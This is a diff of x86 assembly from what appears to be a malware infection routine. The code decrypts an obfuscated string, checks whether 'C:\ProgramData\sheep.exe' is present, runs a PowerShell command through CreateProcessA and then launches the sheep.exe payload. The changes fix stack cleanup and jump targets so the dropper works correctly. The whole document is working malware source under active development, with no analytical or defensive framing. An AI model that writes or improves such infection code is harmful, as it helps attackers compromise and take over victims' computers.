@@ -115,7 +115,7 @@ infection__alloc_powershell_aligned:
    push dword [ebp-8]
    push eax
    call decrypt_string
-   push dword [ebp-0x8]
+   push dword [ebp-8]
    call esi                                                       ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
    cmp eax, 0xFFFFFFFF          ; eax != INVALID_FILE_ATTRIBUTES
    jnz infection__payload_exists
@@ -138,13 +138,13 @@ infection__alloc_powershell_aligned:
    push 0
    call [ebp-4]                 ; CreateProcessA(NULL, "powershell command", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    test eax,eax
-   jz infection__end            ; CreateProcessA failed
+   jz infection__stack_cleanup  ; CreateProcessA failed
 
    push 0xFFFFFFFF
    push dword [ebp-0x68]
    call edi                     ; WaitForSingleObject(proc_info.hProcess, INFINITE)
    test eax,eax
-   jnz infection__end           ; WaitForSingleObject returns 0 on success
+   jnz infection__stack_cleanup ; WaitForSingleObject returns 0 on success
 
    xorps xmm0,xmm0              ; zero out the STARTUPINFO and PROCESS_INFORMATION structures again
    movups [ebp-0x68],xmm0
@@ -169,9 +169,11 @@ infection__payload_exists:
    push 0
    call [ebp-4]                     ; CreateProcessA(NULL, "sheep.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
    
-infection__end:
+infection__stack_cleanup:
    add esp, [ebp-0xC]
    add esp, [ebp-0x14]
+
+infection__end:   
    pop ebx
    pop edi
    pop esi
